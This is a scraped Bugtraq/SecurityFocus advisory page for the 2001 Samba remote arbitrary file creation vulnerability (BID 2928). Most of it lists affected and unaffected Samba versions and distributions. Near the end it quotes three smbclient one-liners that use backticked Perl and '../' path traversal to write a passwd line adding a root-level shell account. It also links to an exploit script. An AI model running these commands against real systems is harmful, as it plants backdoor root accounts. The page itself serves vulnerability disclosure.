@@ -1,0 +1,1564 @@
+#SpeeDr00t@Black Falcon<br>#bid2928<p><b><span style="font-size: 18pt;">Samba Remote Arbitrary File Creation Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/2928/info">info</a><br><a href="http://www.securityfocus.com/bid/2928/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/2928/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/2928/solution">solution</a><br><a href="http://www.securityfocus.com/bid/2928/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				2928
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jun 23 2001 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jun 23 2001 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was announced to BugTraq by Michal Zalewski &lt;lcamtuf@bos.bindview.com&gt; on June 23, 2001.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Samba Samba 2.2 .0<br/>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.2 <br/>
+</span>
+					
+				
+					Samba Samba 2.0.9 <br/>
+<span class="related">
+						
+							-
+						
+						Apple Mac OS X 10.0.4 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apple Mac OS X 10.0.4 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apple Mac OS X Server 10.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apple Mac OS X Server 10.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Caldera OpenLinux Server 3.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Caldera OpenLinux Workstation 3.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Caldera OpenLinux Workstation 3.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.2 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.2 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 7.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 7.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 7.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 7.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux  6.2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux  6.2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.1 sparc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.1 sparc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.1 ppc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.1 ppc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.1 alpha<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.1 alpha<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.0 sparc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.0 sparc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.0 ppc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.0 ppc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.0 alpha<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.0 alpha<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 6.4 ppc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 6.4 ppc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 6.4 alpha<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 6.4 alpha<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 6.4 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 6.4 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 6.3 alpha<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 6.3 alpha<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 6.3 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 6.3 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  8_x86<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  8_x86<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  8_sparc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  8_sparc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  7.0_x86<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  7.0_x86<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  7.0<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  7.0<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Trustix Secure Linux 1.2 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Trustix Secure Linux 1.2 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Trustix Secure Linux 1.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Trustix Secure Linux 1.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Wirex Immunix OS 7.0 -Beta<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Wirex Immunix OS 7.0 -Beta<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Wirex Immunix OS 7.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Wirex Immunix OS 7.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Wirex Immunix OS 6.2 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Wirex Immunix OS 6.2 <br/>
+</span>
+					
+				
+					Samba Samba 2.0.8 <br/>
+<span class="related">
+						
+							-
+						
+						Caldera OpenLinux 2.4 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Caldera OpenLinux 2.4 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.2  sparc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.2  sparc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.2  powerpc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.2  powerpc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.2  arm<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.2  arm<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.2  alpha<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.2  alpha<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.2  68k<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.2  68k<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.2 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 2.2 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 7.1  i386<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 7.1  i386<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 7.1  alpha<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 7.0  i386<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 7.0  i386<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 7.0  alpha<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 7.0  alpha<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 6.2  sparc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 6.2  sparc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 6.2  i386<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 6.2  i386<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 6.2  alpha<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 6.2  alpha<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 5.2  sparc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 5.2  sparc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 5.2  i386<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 5.2  i386<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 5.2  alpha<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 5.2  alpha<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 6.4 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 6.4 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						SCO eDesktop 2.4 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						SCO eDesktop 2.4 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						SCO eServer 2.3.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						SCO eServer 2.3.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  8_x86<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  8_x86<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  8_sparc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  8_sparc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  7.0_x86<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  7.0_x86<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  7.0<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  7.0<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Wirex Immunix OS 7.0 -Beta<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Wirex Immunix OS 7.0 -Beta<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Wirex Immunix OS 7.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Wirex Immunix OS 7.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Wirex Immunix OS 6.2 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Wirex Immunix OS 6.2 <br/>
+</span>
+					
+				
+					Samba Samba 2.0.7 <br/>
+<span class="related">
+						
+							+ 
+						
+						Caldera OpenLinux 2.3 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Caldera OpenLinux 2.3 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.3  sparc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.3  sparc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.3  powerpc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.3  powerpc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.3  alpha<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.3  alpha<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.3 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.3 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2  sparc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2  sparc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2  powerpc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2  powerpc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2  arm<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2  arm<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2  alpha<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2  alpha<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2  68k<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2  68k<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						FreeBSD FreeBSD 5.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						FreeBSD FreeBSD 5.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						FreeBSD FreeBSD 4.2 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						FreeBSD FreeBSD 4.2 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Mandriva Linux Mandrake 7.1 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Mandriva Linux Mandrake 7.1 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Mandriva Linux Mandrake 7.0 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Mandriva Linux Mandrake 7.0 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Progeny Debian 1.0 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Progeny Debian 1.0 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 7.1  i686<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 7.1  i686<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 7.1  i586<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 7.1  i586<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 7.1  i386<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 7.1  i386<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 7.1 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 7.1 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 7.0  i686<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 7.0  i686<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 7.0  i386<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 7.0  i386<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 7.0 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 7.0 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.2 E sparc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.2 E i386<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.2 E alpha<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.2  sparc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.2  i386<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.2  alpha<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.1  sparc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.1  i386<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.1  alpha<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						SCO eDesktop 2.4 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						SCO eDesktop 2.4 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						SCO eServer 2.3.1 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						SCO eServer 2.3.1 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Sun Cobalt Qube3 4000WG  <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Sun Cobalt Qube3 4000WG  <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Sun Cobalt RaQ 550 4100R  <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Sun Cobalt RaQ 550 4100R  <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Sun Cobalt RaQ XTR 3500R  <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Sun Cobalt RaQ XTR 3500R  <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Trustix Secure Linux 1.2 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Trustix Secure Linux 1.2 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Trustix Secure Linux 1.1 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Trustix Secure Linux 1.1 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Wirex Immunix OS 7.0 -Beta<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Wirex Immunix OS 7.0 -Beta<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Wirex Immunix OS 7.0 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Wirex Immunix OS 7.0 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Wirex Immunix OS 6.2 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Wirex Immunix OS 6.2 <br/>
+</span>
+					
+				
+					Samba Samba 2.0.6 <br/>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.2 sparcv9<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.2 sparcv9<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.2 E sparc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.2 E sparc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.2 E i386<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.2 E i386<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.2 E alpha<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.2 E alpha<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.2  sparc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.2  sparc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.2  i386<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.2  i386<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.2  alpha<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 6.2  alpha<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux  6.2<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux  6.2<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Sun Cobalt RaQ4 3001R  <br/>
+</span>
+					
+				
+					Samba Samba 2.0.5 <br/>
+<span class="related">
+						
+							-
+						
+						Caldera OpenLinux 2.3 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Caldera OpenLinux 2.3 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						SCO eServer 2.3.1 <br/>
+</span>
+					
+				
+					HP CIFS/9000 Server  A.01.06<br/>
+<span class="related">
+						
+							-
+						
+						HP HP-UX 11.11 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						HP HP-UX 11.0 <br/>
+</span>
+					
+				
+					HP CIFS/9000 Server  A.01.05<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Samba Samba 2.2 .0a<br/>
+<span class="related">
+						
+							+ 
+						
+						S.u.S.E. Linux 7.2 i386<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						S.u.S.E. Linux 7.2 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						S.u.S.E. Linux 7.2 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Slackware Linux 8.0 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Slackware Linux 8.0 <br/>
+</span>
+					
+				
+					Samba Samba 2.0.10 <br/>
+<span class="related">
+						
+							+ 
+						
+						S.u.S.E. Linux 7.1 x86<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						S.u.S.E. Linux 7.1 x86<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						S.u.S.E. Linux 7.1 sparc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						S.u.S.E. Linux 7.1 sparc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						S.u.S.E. Linux 7.1 ppc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						S.u.S.E. Linux 7.1 ppc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						S.u.S.E. Linux 7.1 alpha<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						S.u.S.E. Linux 7.1 alpha<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						S.u.S.E. Linux 7.1 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						S.u.S.E. Linux 7.1 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Veritas Software ServPoint NAS 3.5 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Veritas Software ServPoint NAS 1.2.2 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Veritas Software ServPoint NAS 1.2.2 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Veritas Software ServPoint NAS 1.2.1 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Veritas Software ServPoint NAS 1.2.1 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Veritas Software ServPoint NAS 1.2 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Veritas Software ServPoint NAS 1.2 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Veritas Software ServPoint NAS 1.1 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Veritas Software ServPoint NAS 1.1 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Wirex Immunix OS  7+<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Wirex Immunix OS  7+<br/>
+</span>
+					
+				
+					HP CIFS/9000 Server  A.01.07<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Some variations of methods used to exploit this vulnerability:<br/><br/>From Michal Zalewski &lt;lcamtuf@bos.bindview.com&gt;<br/><br/>smbclient //NIMUE/"`perl -e '{print "\ntoor::0:0::/:/bin/sh\n"}'`" -n ../../../tmp/x -N<br/><br/>From zhhsun &lt;zhhsun@xanet.edu.cn&gt;<br/><br/>smbclient //NIMUE/"`perl -e '{print "\nopendoor::511:511::/:/bin/sh\n"}'`" -n ../../../tmp/x -N -I 192.168.12.13<br/><br/>and also<br/><br/>smbclient //NIMUE/"`perl -e '{print "\ntoor::0:0::/:/bin/sh\n"}'`" -n ../../../tmp/x -N -I 192.168.12.13<br/><br/>Yugo Yugos &lt;yuggoboy@hotmail.com&gt; provided an exploit script.  It is available at http://www.#no_exploit/data/vulnerabilities/exploits/samba-exp.sh
+	
+		<ul>
+</ul>
+</div>
